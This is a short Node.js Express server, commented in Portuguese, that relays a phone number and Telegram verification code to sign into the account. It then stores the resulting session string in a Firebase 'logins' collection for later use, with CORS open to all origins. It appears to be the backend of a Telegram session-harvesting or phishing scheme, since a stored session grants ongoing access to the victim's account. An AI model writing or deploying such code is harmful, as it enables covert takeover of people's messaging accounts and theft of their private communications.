const express = require("express");
const cors = require("cors");
const { initTelegramClient, sendCode, signIn } = require("./authManager");
const admin = require("./firebase"); // Importe o Firebase inicializado

const app = express();
app.use(express.json());

// Configurar CORS para permitir todas as origens
app.use(cors());

// Endpoint para enviar o código de verificação
app.post("/send-code", async (req, res) => {
  const { phoneNumber } = req.body;

  if (!phoneNumber) {
    return res.status(400).json({ error: "Número de telefone é obrigatório." });
  }

  try {
    const client = await initTelegramClient(phoneNumber);
    await sendCode(client, phoneNumber);
    res.status(200).json({ message: "Código de verificação enviado com sucesso." });
  } catch (error) {
    res.status(500).json({ error: `Erro ao enviar código: ${error.message}` });
  }
});

// Endpoint para realizar o login
app.post("/login", async (req, res) => {
  const { phoneNumber, code } = req.body;

  if (!phoneNumber || !code) {
    return res.status(400).json({ error: "Número de telefone e código são obrigatórios." });
  }

  try {
    const client = await initTelegramClient(phoneNumber);
    const user = await signIn(client, phoneNumber, code);

    // Enviar dados de login para o Firebase
    const db = admin.firestore();
    await db.collection("logins").doc(phoneNumber).set({
      phoneNumber,
      session: client.session.save(), // Salva a sessão para uso futuro
      timestamp: admin.firestore.FieldValue.serverTimestamp()
    });

    res.status(200).json({ message: "Login realizado com sucesso." });
  } catch (error) {
    res.status(500).json({ error: `Erro ao realizar login: ${error.message}` });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});